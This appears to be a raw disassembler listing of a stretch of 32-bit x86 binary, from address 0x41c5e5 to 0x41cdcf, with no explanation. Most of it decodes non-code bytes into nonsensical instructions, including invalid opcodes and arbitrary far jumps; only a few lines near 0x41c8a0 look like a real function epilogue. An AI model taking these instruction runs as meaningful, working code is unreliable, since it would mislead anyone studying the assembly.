  41c5e5:	sbb    eax,0x7d1b7c87
  41c5ea:	xchg   DWORD PTR [ecx-0x60],edi
  41c5ed:	or     esp,DWORD PTR [ebx]
  41c5ef:	mov    ebp,0xe9d26cd9
  41c5f4:	xchg   edi,eax
  41c5f5:	cmp    al,0x25
  41c5f7:	cmp    eax,0xfbb1f0ad
  41c5fc:	stos   BYTE PTR es:[edi],al
  41c5fd:	fisubr WORD PTR [edx-0xb]
  41c600:	(bad)  
  41c601:	into   
  41c602:	in     eax,dx
  41c603:	cmp    bh,BYTE PTR [edx]
  41c605:	add    esi,ecx
  41c607:	add    DWORD PTR [esi+0x460fd7e],esi
  41c60d:	sub    al,BYTE PTR [esp+ecx*4+0xd792f1e]
  41c614:	fdivr  DWORD PTR [ebx-0x26]
  41c617:	cmp    al,0x68
  41c619:	lock adc al,0xf1
  41c61c:	jne    0x41c5d0
  41c61e:	jno    0x41c62f
  41c620:	in     al,dx
  41c621:	push   eax
  41c622:	std    
  41c623:	inc    esp
  41c624:	retf   0x88b1
  41c627:	cmp    bl,BYTE PTR es:[esi]
  41c62a:	jmp    0xe0ee:0x19645169
  41c631:	fnstenv [eax-0x34f8b7e2]
  41c637:	jnp    0x41c5c9
  41c639:	ret    0xbc6c
  41c63c:	add    DWORD PTR [ebp+0x20768a37],esi
  41c642:	jl     0x41c5e8
  41c644:	int3   
  41c645:	fstp   DWORD PTR [ecx]
  41c647:	xor    al,0xf1
  41c649:	adc    DWORD PTR fs:[edx],edi
  41c64c:	rcr    DWORD PTR [bp+0xa],1
  41c650:	aaa    
  41c651:	call   0x7159f590
  41c656:	in     al,0xc4
  41c658:	xlat   BYTE PTR ds:[ebx]
  41c659:	cmovle esi,DWORD PTR [edx+0x4e8c8123]
  41c660:	aad    0x89
  41c662:	sub    al,0x76
  41c664:	xor    ecx,DWORD PTR [ecx]
  41c666:	test   al,0x9e
  41c668:	pop    eax
  41c669:	fcomp  DWORD PTR [esi-0x16]
  41c66c:	xchg   ebx,eax
  41c66d:	jg     0x41c60e
  41c66f:	scas   al,BYTE PTR es:[edi]
  41c670:	mov    eax,ds:0x87dc6c80
  41c675:	inc    ebx
  41c676:	pop    ecx
  41c677:	loopne 0x41c68b
  41c679:	popf   
  41c67a:	aas    
  41c67b:	pop    ds
  41c67c:	push   ebx
  41c67d:	fs pop ebp
  41c67f:	lahf   
  41c680:	dec    esi
  41c681:	jl     0x41c620
  41c683:	mov    dh,0x10
  41c685:	popf   
  41c686:	adc    bh,BYTE PTR [edi-0x53a53058]
  41c68c:	pop    ss
  41c68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c68e:	mov    al,ds:0xd26dbc43
  41c693:	(bad)  
  41c695:	inc    edx
  41c696:	scas   al,BYTE PTR es:[edi]
  41c697:	cmc    
  41c698:	cmp    al,0xb8
  41c69a:	mov    bl,0x7a
  41c69c:	(bad)  
  41c69e:	out    0xda,eax
  41c6a0:	iret   
  41c6a1:	mov    esi,0x87f5a867
  41c6a6:	test   eax,0x9a4bf723
  41c6ab:	rcr    DWORD PTR [ecx-0x5a9d0f5f],0x80
  41c6b2:	jl     0x41c6fb
  41c6b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6b5:	fs cli 
  41c6b7:	adc    eax,0xbee54e1
  41c6bc:	add    DWORD PTR [ebp+0x62],ebx
  41c6bf:	ins    DWORD PTR es:[edi],dx
  41c6c0:	adc    BYTE PTR [edx+0x50e7737f],0xb4
  41c6c7:	xor    BYTE PTR [esi],bl
  41c6c9:	inc    DWORD PTR [esi+0x73]
  41c6cc:	jo     0x41c734
  41c6ce:	stos   DWORD PTR es:[edi],eax
  41c6cf:	repnz sub edi,ebx
  41c6d2:	int3   
  41c6d3:	adc    al,0x52
  41c6d5:	pop    edx
  41c6d6:	int    0x52
  41c6d8:	mov    ds:0xfda60e89,al
  41c6dd:	aam    0x70
  41c6df:	adc    eax,0xbb4efba2
  41c6e4:	pushf  
  41c6e5:	pop    eax
  41c6e6:	in     eax,0x4b
  41c6e8:	push   ebx
  41c6e9:	mov    DWORD PTR [edx-0xa35a450],ebx
  41c6ef:	cld    
  41c6f0:	dec    eax
  41c6f1:	jle    0x41c69b
  41c6f3:	cmp    al,0x41
  41c6f5:	pop    ebx
  41c6f6:	imul   esi,DWORD PTR [edx-0x15e634e0],0x47
  41c6fd:	dec    ecx
  41c6fe:	jns    0x41c6c3
  41c700:	mov    eax,0xf20cf02d
  41c705:	jb     0x41c6da
  41c707:	les    ebx,FWORD PTR [ebx+ebx*4-0x4c]
  41c70b:	daa    
  41c70c:	mov    esi,0x79de9e21
  41c711:	loop   0x41c6b6
  41c713:	lods   eax,DWORD PTR ds:[esi]
  41c714:	mov    cl,BYTE PTR [ebp+0x16]
  41c717:	je     0x41c749
  41c719:	sub    eax,0xae4ac01a
  41c71e:	retf   0xb40b
  41c721:	not    ebx
  41c723:	xchg   bl,ah
  41c725:	pop    edx
  41c726:	jne    0x41c75e
  41c728:	js     0x41c709
  41c72a:	push   cs
  41c72b:	sti    
  41c72c:	in     eax,dx
  41c72d:	push   ecx
  41c72e:	shl    BYTE PTR [ecx-0x46c257c1],0xae
  41c735:	into   
  41c736:	push   0xffffffed
  41c738:	repnz xchg esp,eax
  41c73a:	add    ebx,DWORD PTR [edi]
  41c73c:	rcl    DWORD PTR [edx+0x3f903021],1
  41c742:	popa   
  41c743:	test   eax,0xf978685c
  41c748:	retf   0x6af8
  41c74b:	xchg   BYTE PTR [eax-0x14e8427],cl
  41c751:	pop    eax
  41c752:	cmp    al,0xf9
  41c754:	mov    ecx,0x74f2cdc5
  41c759:	cld    
  41c75a:	shl    BYTE PTR [esi-0x36],cl
  41c75d:	mov    cl,0x90
  41c75f:	add    edi,DWORD PTR [esi-0x6066ea0b]
  41c765:	inc    ebx
  41c766:	inc    esi
  41c767:	jnp    0x41c728
  41c769:	or     edi,0xc907642a
  41c76f:	mov    ds:0x3d4c9c9,al
  41c774:	xchg   esi,eax
  41c775:	sub    BYTE PTR [eax+eiz*4-0x22],bl
  41c779:	push   es
  41c77a:	pop    ebx
  41c77c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c77d:	xchg   edi,eax
  41c77e:	jecxz  0x41c773
  41c780:	je     0x41c777
  41c782:	xchg   edi,eax
  41c783:	add    ah,BYTE PTR [esi-0x45d660c7]
  41c789:	or     bl,BYTE PTR ds:0xa8647bf6
  41c78f:	mov    cl,0xb0
  41c791:	ins    BYTE PTR es:[edi],dx
  41c792:	fsubr  QWORD PTR [edi+0x4e]
  41c795:	adc    BYTE PTR [edi+0x5104f4ff],0x8e
  41c79c:	or     bh,ah
  41c79e:	rcl    dl,1
  41c7a0:	rol    BYTE PTR [ebp+0x5419cc0c],1
  41c7a6:	sub    eax,0xdff39d2f
  41c7ab:	pop    ss
  41c7ac:	scas   al,BYTE PTR es:[edi]
  41c7ad:	(bad)  
  41c7ae:	mov    ch,BYTE PTR [eax+0x22]
  41c7b1:	and    bh,BYTE PTR [esi-0x34f23dd3]
  41c7b7:	daa    
  41c7b8:	icebp  
  41c7b9:	clc    
  41c7ba:	aad    0xcb
  41c7bc:	jne    0x41c7c3
  41c7be:	mov    dh,bh
  41c7c0:	enter  0x45,0xe7
  41c7c4:	mov    ah,0x9b
  41c7c6:	push   esi
  41c7c7:	push   0xcc548eef
  41c7cc:	retf   
  41c7cd:	iret   
  41c7ce:	jmp    0xa226:0x9e458256
  41c7d5:	in     eax,dx
  41c7d6:	push   edx
  41c7d7:	mov    edx,0xc6275a2a
  41c7dc:	pop    ds
  41c7dd:	pop    ecx
  41c7de:	mov    ?,WORD PTR [edx]
  41c7e0:	std    
  41c7e1:	sub    dl,BYTE PTR [eax+0x78e4b94a]
  41c7e7:	retf   0xbbdb
  41c7ea:	push   ebx
  41c7eb:	jnp    0x41c835
  41c7ed:	aaa    
  41c7ee:	jecxz  0x41c77c
  41c7f0:	(bad)  
  41c7f2:	adc    bl,BYTE PTR [ecx+0x7e]
  41c7f5:	jb     0x41c7f3
  41c7f7:	out    dx,al
  41c7f8:	sbb    al,0xa7
  41c7fa:	inc    edi
  41c7fb:	les    ebx,FWORD PTR [edx]
  41c7fd:	ja     0x41c7ea
  41c7ff:	sti    
  41c800:	jl     0x41c873
  41c802:	sub    cl,BYTE PTR [ebx+0x50430a9f]
  41c808:	sbb    esi,eax
  41c80a:	pop    es
  41c80b:	loop   0x41c7ec
  41c80d:	repnz push esi
  41c80f:	es or  al,0x2f
  41c813:	in     eax,dx
  41c814:	inc    edx
  41c815:	mov    esi,0x61136a37
  41c81a:	pushf  
  41c81b:	push   ebp
  41c81c:	and    DWORD PTR [eax+0x6a6cd410],ebp
  41c822:	xor    ebp,DWORD PTR [esi+0x4eb4095a]
  41c828:	ss leave 
  41c82a:	ret    
  41c82b:	add    BYTE PTR [esp+ecx*1-0x67],bh
  41c82f:	mov    ah,0xe2
  41c831:	sub    DWORD PTR [edi+0x55],0xd909e265
  41c838:	mov    al,ds:0xd40495db
  41c83d:	and    BYTE PTR [ebx],cl
  41c83f:	add    al,BYTE PTR [ebx+esi*8-0x4a]
  41c843:	dec    BYTE PTR [edx]
  41c845:	scas   al,BYTE PTR es:[edi]
  41c846:	mov    ebx,0xfc9edce
  41c84b:	in     eax,dx
  41c84c:	adc    eax,0xa8a4c0c2
  41c851:	in     al,dx
  41c852:	dec    esp
  41c853:	adc    BYTE PTR [ecx],ch
  41c855:	xchg   ebp,edx
  41c857:	lahf   
  41c858:	dec    ecx
  41c859:	inc    eax
  41c85a:	in     al,dx
  41c85b:	xlat   BYTE PTR ds:[ebx]
  41c85c:	fs dec ebp
  41c85e:	cmp    DWORD PTR [esi+esi*1-0x6d],0xd4960cc5
  41c866:	dec    ebx
  41c867:	sub    BYTE PTR [edx-0xd12a5a2],ch
  41c86d:	fnstcw WORD PTR [ecx-0x59]
  41c870:	lods   al,BYTE PTR ds:[esi]
  41c871:	add    edx,DWORD PTR [edi+ecx*2]
  41c874:	bound  esi,QWORD PTR [ebp+0x49]
  41c877:	cwde   
  41c878:	push   0x77
  41c87a:	clc    
  41c87b:	push   0x703bc9d9
  41c880:	es cmc 
  41c882:	or     BYTE PTR [eax+0x3c],al
  41c885:	es mov esi,0x67384253
  41c88b:	test   DWORD PTR [esi-0x74],edi
  41c88e:	sbb    eax,0xb8c627d8
  41c893:	aam    0x4b
  41c895:	fwait
  41c896:	inc    esi
  41c897:	icebp  
  41c898:	pop    ebx
  41c899:	call   0x284bd97d
  41c89e:	add    eax,ecx
  41c8a0:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8a3:	imul   eax,ecx
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0xcc2288e2
  41c8c2:	test   BYTE PTR [ebx+0x185af],ah
  41c8c8:	scas   al,BYTE PTR es:[edi]
  41c8c9:	add    BYTE PTR [eax],al
  41c8cb:	add    BYTE PTR [ebp-0x2ae993bd],bl
  41c8d1:	lock inc edx
  41c8d3:	push   edx
  41c8d4:	ja     0x41c863
  41c8d6:	add    al,BYTE PTR [edi]
  41c8d8:	cmp    eax,0xc28ff940
  41c8dd:	adc    BYTE PTR [ebp-0x2b],dh
  41c8e0:	stos   BYTE PTR es:[edi],al
  41c8e1:	push   eax
  41c8e2:	adc    edi,edi
  41c8e4:	pop    ebp
  41c8e5:	sub    DWORD PTR [esi+0x621e2468],esp
  41c8eb:	mov    DWORD PTR [ebx+ebx*8-0x69416990],ebp
  41c8f2:	bound  esp,QWORD PTR [ecx+0x55]
  41c8f5:	and    ebx,eax
  41c8f7:	mov    esi,0x5ab0ffd3
  41c8fc:	inc    ecx
  41c8fd:	test   cl,0x4e
  41c900:	stc    
  41c901:	lds    esp,FWORD PTR [esi]
  41c903:	dec    edi
  41c904:	ins    DWORD PTR es:[edi],dx
  41c905:	cmp    al,0x36
  41c907:	mov    dh,0xd5
  41c909:	jmp    0x4a8c761b
  41c90e:	loopne 0x41c942
  41c910:	or     eax,0x337e04c4
  41c915:	aam    0x37
  41c917:	and    ch,BYTE PTR [esi]
  41c919:	jo     0x41c930
  41c91b:	or     eax,0x9123e87b
  41c920:	popa   
  41c921:	push   0xa7aabdca
  41c926:	or     eax,0x25849c61
  41c92b:	jbe    0x41c96f
  41c92d:	ds pop ds
  41c92f:	cld    
  41c930:	add    ebx,ecx
  41c932:	(bad)  
  41c933:	nop
  41c934:	iret   
  41c935:	int3   
  41c936:	call   0x9b09:0x9f0b7595
  41c93d:	jmp    0x66ed91df
  41c942:	mov    gs,WORD PTR [ebx+0x51ca9706]
  41c948:	mov    ah,0x2a
  41c94a:	sub    DWORD PTR [edx-0x75],0xa7cf9515
  41c951:	and    dh,ch
  41c953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c954:	push   ebp
  41c955:	dec    eax
  41c956:	dec    esp
  41c957:	rcl    DWORD PTR [edi+0x1d1f0be2],1
  41c95d:	mov    esp,0x7a49cbf1
  41c962:	dec    esi
  41c963:	lahf   
  41c964:	push   edi
  41c965:	in     eax,0xcf
  41c967:	arpl   WORD PTR [ecx],bx
  41c969:	jp     0x41c8f9
  41c96b:	xchg   ebx,eax
  41c96c:	(bad)  
  41c96d:	hlt    
  41c96e:	mov    dh,0xa6
  41c970:	mov    DWORD PTR [ecx+eiz*4],edx
  41c973:	add    DWORD PTR [ebx+0x8],0x6e7649aa
	...
  41c982:	add    BYTE PTR [eax],al
  41c984:	shr    DWORD PTR [esp+edx*1],1
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0x565f6350
  41c994:	pop    ebp
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [esi+0x5a000000],ch
  41c99d:	dec    edi
  41c99e:	clc    
  41c99f:	mov    DWORD PTR [ebp*1-0x441ac086],0x73f87d81
  41c9aa:	aad    0xb6
  41c9ac:	pop    eax
  41c9ad:	mov    ebp,0x29bfe8e8
  41c9b2:	test   al,0xa5
  41c9b4:	(bad)
  41c9b7:	arpl   WORD PTR [eax+eiz*4+0x1e],ax
  41c9bb:	sbb    BYTE PTR [ecx],bh
  41c9bd:	sub    eax,DWORD PTR [ebp+0x78084c26]
  41c9c3:	ss cmp al,0x5b
  41c9c6:	mov    ds:0xb02fd8b9,al
  41c9cb:	call   0x596a1c74
  41c9d0:	sti    
  41c9d1:	sub    DWORD PTR [ebx],eax
  41c9d3:	jp     0x41c957
  41c9d5:	sar    DWORD PTR [ebp-0x51],1
  41c9d8:	lea    edx,[esi]
  41c9da:	cwde   
  41c9db:	fistp  QWORD PTR [ecx]
  41c9dd:	jge    0x41c9ff
  41c9df:	int    0x6f
  41c9e1:	cmp    eax,0x32d0cd45
  41c9e6:	adc    DWORD PTR [esi-0x7f],edi
  41c9e9:	rol    eax,cl
  41c9eb:	ror    dl,0x8f
  41c9ee:	(bad)  
  41c9ef:	cmp    BYTE PTR [edx+eiz*2],ah
  41c9f2:	ja     0x41ca4f
  41c9f4:	xchg   esp,eax
  41c9f5:	call   0xb457:0xddc9722b
  41c9fc:	cwde   
  41c9fd:	sub    dh,BYTE PTR [ecx]
  41c9ff:	fucomip st,st(0)
  41ca01:	rol    esi,0xe2
  41ca04:	lods   al,BYTE PTR ds:[esi]
  41ca05:	imul   ecx,DWORD PTR [edi],0xffffffee
  41ca08:	sub    BYTE PTR [ecx-0x58],0x25
  41ca0c:	push   edi
  41ca0d:	push   ds
  41ca0e:	push   cs
  41ca0f:	lods   al,BYTE PTR ds:[esi]
  41ca10:	lds    edi,FWORD PTR ds:0x20093c4f
  41ca16:	out    0xef,eax
  41ca18:	imul   ebx,edi,0x586f0b69
  41ca1e:	rcr    DWORD PTR [ecx+0x7affd51c],1
  41ca24:	scas   eax,DWORD PTR es:[edi]
  41ca25:	in     al,dx
  41ca26:	xchg   ebp,eax
  41ca28:	test   DWORD PTR [edx],eax
  41ca2a:	mov    fs,WORD PTR [edx]
  41ca2c:	cld    
  41ca2d:	or     BYTE PTR [ebx],al
  41ca2f:	mov    al,0x8c
  41ca31:	call   0x8965:0x60372a82
  41ca38:	pop    eax
  41ca39:	cs or  ch,dh
  41ca3c:	(bad)  
  41ca3e:	dec    ebx
  41ca3f:	add    al,0x69
  41ca42:	pop    ss
  41ca43:	or     ch,BYTE PTR [esi-0x1464b515]
  41ca49:	and    eax,DWORD PTR [eax]
	...
  41ca53:	add    BYTE PTR [edi],bl
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2-0x39a9194d],0xb
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [esi-0x60000000],ch
  41ca6d:	fcom   st(4)
  41ca6f:	add    BYTE PTR [edi],ah
  41ca71:	mov    esi,fs
  41ca73:	ins    BYTE PTR es:[edi],dx
  41ca74:	mov    ch,BYTE PTR [ebx+0x4364cd6c]
  41ca7a:	adc    eax,0x5dff85d7
  41ca7f:	add    BYTE PTR [esi-0x2e],bh
  41ca82:	mov    eax,0x78af5ed5
  41ca87:	ret    0x4c55
  41ca8a:	pusha  
  41ca8b:	mov    bl,0xd
  41ca8d:	xlat   BYTE PTR ds:[ebx]
  41ca8e:	cld    
  41ca8f:	in     eax,dx
  41ca90:	mov    DWORD PTR [eax-0x19],0x7063e02a
  41ca97:	out    dx,eax
  41ca98:	pop    es
  41ca99:	es (bad) 
  41ca9b:	and    esp,DWORD PTR [eax]
  41ca9d:	lods   eax,DWORD PTR ds:[esi]
  41ca9e:	pop    ds
  41ca9f:	stc    
  41caa0:	ror    BYTE PTR [ecx+ecx*4-0x13],0x60
  41caa5:	test   BYTE PTR [edi],bl
  41caa7:	int3   
  41caa8:	jo     0x41ca34
  41caaa:	push   0x29
  41caac:	xchg   DWORD PTR [edx-0x67],eax
  41caaf:	outs   dx,DWORD PTR ds:[esi]
  41cab0:	pop    edi
  41cab1:	xor    DWORD PTR [edx+eiz*4],0x2c2e8fdc
  41cab8:	xor    BYTE PTR [edi],al
  41caba:	sub    eax,0x910f352e
  41cabf:	inc    eax
  41cac0:	sti    
  41cac1:	pushf  
  41cac2:	cmc    
  41cac3:	sub    DWORD PTR [ebp-0x7bec7272],0x7b0e26f8
  41cacd:	(bad)  
  41cace:	iret   
  41cacf:	jmp    0x89db3f3c
  41cad4:	mov    bl,0xba
  41cad6:	sub    DWORD PTR [ebx+0x701a8286],0x7c7eb895
  41cae0:	sub    esi,DWORD PTR [edi+0x78]
  41cae3:	cmp    eax,0x3ba8a87a
  41cae8:	shl    BYTE PTR [ebx-0x891b6c3],0xb0
  41caef:	and    BYTE PTR [ebx+eiz*2],cl
  41caf2:	sbb    eax,0x21838978
  41caf7:	mov    al,ds:0x517a83a9
  41cafc:	push   es
  41cafd:	add    BYTE PTR [edi+0x66901d58],bl
  41cb03:	dec    ecx
  41cb04:	xor    BYTE PTR [esi-0xbd73a9b],dh
  41cb0a:	sbb    eax,0xaab7987a
  41cb0f:	out    dx,al
  41cb10:	or     bl,BYTE PTR [edi+0x1]
  41cb13:	jmp    0x41cad6
  41cb15:	jmp    0x0:0x6ee834b9
	...
  41cb24:	das    
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	jae    0x41cb82
  41cb32:	cld    
  41cb33:	stos   DWORD PTR es:[edi],eax
  41cb34:	mov    ecx,0xae000187
  41cb39:	add    BYTE PTR [eax],al
  41cb3b:	add    BYTE PTR [edi-0x4a42b749],dl
  41cb41:	(bad)  
  41cb42:	fsub   DWORD PTR [ebx+0x740150f4]
  41cb48:	mov    ebp,0x9b2962f4
  41cb4d:	sti    
  41cb4e:	aad    0x2d
  41cb50:	sub    BYTE PTR [edi-0x62],bl
  41cb53:	xor    eax,0xba39a9ff
  41cb58:	arpl   bp,sp
  41cb5a:	inc    ebx
  41cb5b:	mov    ds:0x211f1790,al
  41cb60:	dec    edi
  41cb61:	(bad)  
  41cb62:	jecxz  0x41cb4a
  41cb64:	adc    DWORD PTR [eax+0x63a25395],edi
  41cb6a:	scas   al,BYTE PTR es:[edi]
  41cb6b:	or     DWORD PTR [ebx+ecx*2+0x340f15e0],ebp
  41cb72:	mov    ?,WORD PTR [esi+0x40d80c0f]
  41cb78:	sbb    al,0xb1
  41cb7a:	ja     0x41cbd7
  41cb7c:	pop    edi
  41cb7d:	mov    ebx,0x44b2b5a8
  41cb82:	les    esi,FWORD PTR [edi-0x13]
  41cb85:	and    al,0x32
  41cb87:	mov    esp,0x78562e85
  41cb8c:	test   edi,0xa3f383f5
  41cb92:	jmp    0x3c1bc0b9
  41cb97:	shl    DWORD PTR [ecx],1
  41cb99:	mov    ah,0x86
  41cb9b:	scas   al,BYTE PTR es:[edi]
  41cb9c:	pop    edi
  41cb9d:	lds    edx,FWORD PTR [ecx]
  41cb9f:	mov    esp,0xb860534
  41cba4:	mov    esp,0x9afbf8ce
  41cba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbaa:	aad    0xb9
  41cbac:	sub    eax,0x5d275602
  41cbb1:	es out 0x86,al
  41cbb4:	cmp    eax,0x8f6bb2c
  41cbb9:	(bad)  
  41cbbb:	jge    0x41cc13
  41cbbd:	inc    ebx
  41cbbe:	and    bh,dl
  41cbc0:	mov    ebx,0xf81cd583
  41cbc5:	imul   BYTE PTR [eax-0x406585e2]
  41cbcb:	xor    DWORD PTR [esi+0x56e299cc],eax
  41cbd1:	mov    ebx,0x5080215f
  41cbd6:	icebp  
  41cbd7:	rcl    DWORD PTR cs:[ebx-0x59b78324],1
  41cbde:	arpl   WORD PTR [esi-0x47],bp
  41cbe1:	xor    eax,0x3a39d795
  41cbe6:	jmp    0x6fcc1d
	...
  41cbf3:	add    dl,cl
  41cbf5:	mov    al,ds:0xdf7e4d76
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0x918f5980,al
  41cc04:	mov    BYTE PTR [bx+di],al
  41cc07:	add    BYTE PTR [esi+0x53000000],ch
  41cc0d:	mov    ds:0x201398e9,al
  41cc12:	or     al,0x9f
  41cc14:	sti    
  41cc15:	mul    BYTE PTR [ebx]
  41cc17:	(bad)  
  41cc18:	lods   al,BYTE PTR ds:[esi]
  41cc19:	mov    esi,0x17ec0895
  41cc1e:	xor    eax,0x97e602b8
  41cc23:	mov    WORD PTR [eax+0x3128fb47],ss
  41cc29:	mov    ds:0x38fef30d,al
  41cc2e:	mov    ds:0xc4ac73f0,eax
  41cc33:	in     eax,dx
  41cc34:	push   ss
  41cc35:	pop    edx
  41cc36:	adc    ecx,esi
  41cc38:	test   al,0x25
  41cc3a:	ror    BYTE PTR [ebp+0x46303a71],cl
  41cc40:	sub    BYTE PTR [ebp+0x2c],cl
  41cc43:	in     al,0x19
  41cc45:	mov    ?,WORD PTR [edi+edx*8-0x59a995d2]
  41cc4c:	test   DWORD PTR [edx+0x6],esi
  41cc4f:	shl    DWORD PTR [eax],cl
  41cc51:	sti    
  41cc52:	das    
  41cc53:	xor    eax,0x7691549e
  41cc58:	addr16 jmp 0x1953:0x82aff2c
  41cc60:	xchg   edx,eax
  41cc61:	and    al,0x4c
  41cc63:	mov    esi,0xac72416b
  41cc68:	fcmovnbe st,st(6)
  41cc6a:	cwde   
  41cc6b:	test   DWORD PTR [eax+0x18],ebx
  41cc6e:	inc    eax
  41cc6f:	and    bl,bl
  41cc71:	out    dx,al
  41cc72:	je     0x41cc00
  41cc74:	cmp    eax,0xb203c03c
  41cc79:	adc    al,0xbc
  41cc7b:	ss pop esi
  41cc7d:	idiv   DWORD PTR gs:[eax]
  41cc80:	xchg   edx,eax
  41cc81:	(bad)  [ebx-0xb]
  41cc84:	in     eax,0xb6
  41cc86:	loope  0x41cca9
  41cc88:	dec    esi
  41cc89:	(bad)  
  41cc8a:	jns    0x41ccf6
  41cc8c:	xor    eax,0xf452da64
  41cc91:	and    esi,DWORD PTR [edx+0xf]
  41cc94:	out    0xe8,eax
  41cc96:	mov    ebx,0xe49e9fd9
  41cc9b:	pop    esi
  41cc9c:	mov    eax,0xbd6e6bfb
  41cca1:	jnp    0x41cc64
  41cca3:	push   ecx
  41cca4:	popa   
  41cca5:	jmp    0x3b3d:0x955225b6
  41ccac:	pop    esp
  41ccad:	cmp    DWORD PTR [ecx],ebx
  41ccaf:	and    BYTE PTR [ebx-0x27650cf1],cl
  41ccb5:	adc    ebx,ecx
  41ccb7:	push   ebx
  41ccb8:	out    0x7d,eax
	...
  41ccc2:	add    BYTE PTR [eax],al
  41ccc4:	(bad)  
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	sub    ah,ah
  41ccd2:	aam    0xa9
  41ccd4:	adc    eax,0xae000189
  41ccd9:	add    BYTE PTR [eax],al
  41ccdb:	add    BYTE PTR [ebp+0x6b],al
  41ccde:	clc    
  41ccdf:	pop    eax
  41cce0:	sbb    bh,bh
  41cce2:	sub    eax,0x95749d8e
  41cce7:	(bad)  
  41cce8:	aas    
  41cce9:	add    eax,0x10b12480
  41ccee:	inc    eax
  41ccef:	dec    esi
  41ccf0:	(bad)  
  41ccf2:	je     0x41cccf
  41ccf4:	adc    ecx,DWORD PTR [esi+0x4b]
  41ccf7:	sbb    BYTE PTR [edi],dl
  41ccf9:	sbb    ebx,edx
  41ccfb:	cmp    bl,BYTE PTR [edi+0x4ad13a8b]
  41cd01:	inc    esi
  41cd02:	std    
  41cd03:	dec    edi
  41cd04:	push   ebx
  41cd05:	sub    eax,DWORD PTR [esi-0x3f]
  41cd08:	jmp    0x41cd17
  41cd0a:	imul   esp,edx,0x2f80767b
  41cd10:	nop
  41cd11:	push   esp
  41cd12:	add    BYTE PTR [edi+0x26],bh
  41cd15:	int3   
  41cd16:	or     BYTE PTR [edx-0x9],bh
  41cd19:	psubusb mm3,QWORD PTR [ebx+0x510216ed]
  41cd20:	push   0x937878c8
  41cd25:	bound  esp,QWORD PTR [ecx+0x48]
  41cd28:	sar    bh,1
  41cd2a:	and    dl,BYTE PTR [eax]
  41cd2c:	mov    esp,DWORD PTR [ebx-0x77]
  41cd2f:	lahf   
  41cd30:	stos   DWORD PTR es:[edi],eax
  41cd31:	jg     0x41cd18
  41cd33:	outs   dx,BYTE PTR ds:[esi]
  41cd34:	jg     0x41cd02
  41cd36:	jns    0x41cced
  41cd38:	jl     0x41cd79
  41cd3a:	xor    DWORD PTR [ebx],0x9b11ba99
  41cd40:	and    eax,0xc5704f3
  41cd45:	sbb    esp,edi
  41cd47:	stos   BYTE PTR es:[edi],al
  41cd48:	and    DWORD PTR [edi+eiz*2],esi
  41cd4b:	xor    DWORD PTR [ecx],esp
  41cd4d:	add    BYTE PTR [ecx],bh
  41cd4f:	mov    WORD PTR [ebp+eiz*4-0x63],?
  41cd53:	pop    edi
  41cd54:	add    ebx,DWORD PTR [edx-0x793ac249]
  41cd5a:	outs   dx,DWORD PTR ds:[esi]
  41cd5b:	pusha  
  41cd5c:	(bad)  [eax+ecx*4]
  41cd5f:	and    esi,edx
  41cd61:	add    bh,ah
  41cd63:	lods   eax,DWORD PTR ds:[esi]
  41cd64:	(bad)  
  41cd65:	mov    ebp,0x40c85223
  41cd6a:	test   al,0xda
  41cd6c:	cmp    al,0x9
  41cd6e:	sar    DWORD PTR [ecx-0x8e7efef],1
  41cd74:	and    eax,0xd7361287
  41cd79:	xor    dl,BYTE PTR [esp+ecx*2-0x28]
  41cd7d:	lds    edx,FWORD PTR [ebp+0x59]
  41cd80:	int3   
  41cd81:	stos   DWORD PTR es:[edi],eax
  41cd82:	in     al,dx
  41cd83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd84:	xor    DWORD PTR [edi-0x7d40809f],edx
	...
  41cd92:	add    BYTE PTR [eax],al
  41cd94:	push   edx
  41cd95:	xor    al,0x40
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0xd6a4e09
  41cda1:	test   eax,0x89c30f27
  41cda6:	add    DWORD PTR [eax],eax
  41cda8:	scas   al,BYTE PTR es:[edi]
  41cda9:	add    BYTE PTR [eax],al
  41cdab:	add    BYTE PTR [esi+0x2a],dh
  41cdae:	mov    dl,BYTE PTR [ebx+ebx*2-0x36de419f]
  41cdb5:	pusha  
  41cdb6:	inc    ecx
  41cdb7:	jno    0x41cd3d
  41cdb9:	mov    ds:0xd5bd2f58,al
  41cdbe:	in     al,dx
  41cdbf:	in     al,dx
  41cdc0:	stos   DWORD PTR es:[edi],eax
  41cdc1:	retf   
  41cdc2:	push   edi
  41cdc3:	addr16 inc ebp
  41cdc5:	xchg   DWORD PTR [eax+ecx*8],esi
  41cdc8:	add    cl,BYTE PTR [ebx+0x59680424]
  41cdce:	pop    ecx
  41cdcf:	xchg   esp,eax
